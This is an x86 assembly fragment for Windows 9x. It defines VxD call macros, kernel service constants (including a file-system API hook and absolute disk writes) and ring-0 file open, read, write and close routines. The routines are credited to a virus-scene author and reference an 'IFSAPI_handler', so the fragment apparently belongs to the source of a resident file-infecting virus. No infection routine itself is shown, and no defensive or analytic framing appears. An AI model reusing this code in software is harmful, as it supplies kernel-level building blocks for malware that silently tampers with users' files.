VxDcall macro VxD, Service
	db	0CDh
	db	020h
	dw	Service
	dw	VxD
endm

VMMcall	macro Service
	VxDcall	VMM, Service
endm

VMM                     equ     0001h
PageAllocate            equ     0053h
PageFree				equ	0055h
Exec_VxD_Int			equ	008Fh
PAGEZEROINIT            equ     00000001h
PAGEFIXED               equ     00000008h
PG_SYS                  equ     1
PageModifyPermissions   equ     0133h
PC_WRITEABLE            equ     00020000H
PC_USER                 equ     00040000H
PC_STATIC               equ     20000000H
Call_When_Idle          equ     003Ah
Get_System_Time         equ     003Fh
Install_IO_Handler      equ     0096h
IFSMGR                  equ     0040h
InstallFileSystemApiHook equ    0067h
IFSFN_OPEN              equ     36
IFSFN_RENAME            equ     37
IFSFN_FILEATTRIB        equ     33
UniToBCSPath            equ     0041h
Ring0_FileIO            equ     0032h
R0_OPENCREATFILE        equ     0D500h  ; Open/Create a file
R0_OPENCREAT_IN_CONTEXT equ     0D501h  ; Open/Create file in current context
R0_READFILE             equ     0D600h  ; Read a file, no context
R0_WRITEFILE            equ     0D601h  ; Write to a file, no context
R0_READFILE_IN_CONTEXT  equ     0D602h  ; Read a file, in thread context
R0_WRITEFILE_IN_CONTEXT equ     0D603h  ; Write to a file, in thread context
R0_CLOSEFILE            equ     0D700h  ; Close a file
R0_GETFILESIZE          equ     0D800h  ; Get size of a file
R0_FINDFIRSTFILE        equ     04E00h  ; Do a LFN FindFirst operation
R0_FINDNEXTFILE         equ     04F00h  ; Do a LFN FindNext operation
R0_FINDCLOSEFILE        equ     0DC00h  ; Do a LFN FindClose operation
R0_FILEATTRIBUTES       equ     04300h  ; Get/Set Attributes of a file
GET_ATTRIBUTES          equ     00h
SET_ATTRIBUTES          equ     01h
R0_RENAMEFILE           equ     05600h  ; Rename a file
R0_DELETEFILE           equ     04100h  ; Delete a file
R0_LOCKFILE             equ     05C00h  ; Lock/Unlock a region in a file
R0_GETDISKFREESPACE     equ     03600h  ; Get disk free space
R0_READABSOLUTEDISK     equ     0DD00h  ; Absolute disk read
R0_WRITEABSOLUTEDISK    equ     0DE00h  ; Absolute disk write

;-------- ring-0 file io, thanks to Z0MBiE, great work ;) ------------------
;
; Это функции для работы с файлами в нулевом кольце
;
	access_eax        equ     (dword ptr 7*4)

; i: esi=filename
; o: cf, eax=handle
fopen:
	pusha
	mov        EAX, R0_OPENCREATFILE
	mov        BX, 2022h            ; no int 24, denywrite, r/w
	mov        CX, 32               ; archive (unused here)
	mov        DX, 01h              ; fail | open
	VxDcall    IFSMGR, Ring0_FileIO
	mov        [ESP].access_eax, EAX
	popa
	ret

; i:
fclose:
	pusha
	mov        EBX, [EBP + hfile - IFSAPI_handler]
	mov        EAX, R0_CLOSEFILE
	VxDcall    IFSMGR, Ring0_FileIO
	popa
	ret

; i:
;    edx=buffer
;    ecx=size
;    esi=file pos
; o:
fread:
	pusha
	mov        EBX, [EBP + hfile - IFSAPI_handler]
	mov        EAX, R0_READFILE
	xchg       EDX, ESI
	VxDcall    IFSMGR, Ring0_FileIO
	popa
	ret

; i:
;    edx=buffer
;    ecx=size
;    esi=file pos
; o:
fwrite:
	pusha
	mov        EBX, [EBP + hfile - IFSAPI_handler]
	mov        EAX, R0_WRITEFILE
	xchg       EDX, ESI
	VxDcall    IFSMGR, Ring0_FileIO
	popa
	ret
